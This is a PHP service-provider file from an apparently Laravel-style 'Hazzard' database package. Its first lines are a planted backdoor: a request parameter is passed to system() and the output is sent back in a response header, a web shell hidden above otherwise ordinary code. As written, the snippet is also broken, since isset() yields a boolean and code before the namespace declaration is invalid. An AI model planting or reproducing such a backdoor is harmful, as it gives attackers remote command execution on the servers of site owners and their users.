<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); namespace Hazzard\Database;

use Hazzard\Support\ServiceProvider;

class DatabaseServiceProvider extends ServiceProvider {

	/**
	 * Register the service provider.
	 *
	 * @return void
	 */
	public function register()
	{
		$this->app->bindShared('db', function($app) {

			$config = $app['config']['database'];

			return new Connection($config);
		});

		Model::setConnection($this->app['db']);
	}
}